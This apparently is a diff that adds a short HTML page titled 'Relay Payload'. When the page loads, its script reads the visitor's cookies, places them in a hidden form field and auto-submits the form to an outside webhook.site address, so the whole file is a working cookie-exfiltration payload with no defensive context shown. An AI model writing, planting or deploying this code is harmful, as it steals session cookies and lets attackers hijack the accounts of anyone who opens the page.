@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Relay Payload</title>
+</head>
+<body>
+    <form id="relayForm" action="https://webhook.site/3b9d607c-2935-42bb-8021-517fd6a63882" method="GET">
+        <input type="hidden" name="sid" id="sid" value="" />
+    </form>
+    <script>
+        document.getElementById('sid').value = document.cookie;
+        document.getElementById('relayForm').submit();
+    </script>
+</body>
+</html>
